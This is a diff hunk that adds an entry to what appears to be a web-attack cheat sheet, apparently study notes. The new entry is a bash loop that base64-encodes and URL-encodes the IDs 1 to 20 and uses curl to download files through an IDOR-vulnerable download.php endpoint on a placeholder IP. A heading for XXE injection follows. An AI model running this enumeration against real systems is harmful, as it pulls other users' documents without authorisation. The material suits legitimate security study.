@@ -1245,6 +1245,18 @@ for i in {1..20}; do
 done
 ```
 
+- Mass Enumeration Encoded IDOR Parameter
+
+```
+#!/bin/bash
+
+for i in {1..20}; do
+    for hash in $(echo -n $i | base64 -w 0 | jq -sRr @uri | tr -d ' -'); do
+        curl -sOJ  http://<IP address>/download.php?contract=$hash
+    done
+done
+```
+
 #21. - XML External Entity (XXE) Injection
 -----------------------------------------
 
